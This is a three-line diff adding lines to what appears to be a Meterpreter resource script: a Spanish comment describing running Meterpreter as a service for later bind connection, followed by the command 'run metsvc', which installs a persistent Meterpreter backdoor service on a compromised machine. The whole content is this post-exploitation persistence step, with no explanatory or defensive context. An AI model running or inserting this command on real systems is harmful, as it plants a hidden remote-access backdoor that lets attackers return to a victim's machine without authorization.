@@ -1,0 +1,3 @@
+
+# Meterpreter en modo servicio para conexion posterior por bind	
+run metsvc
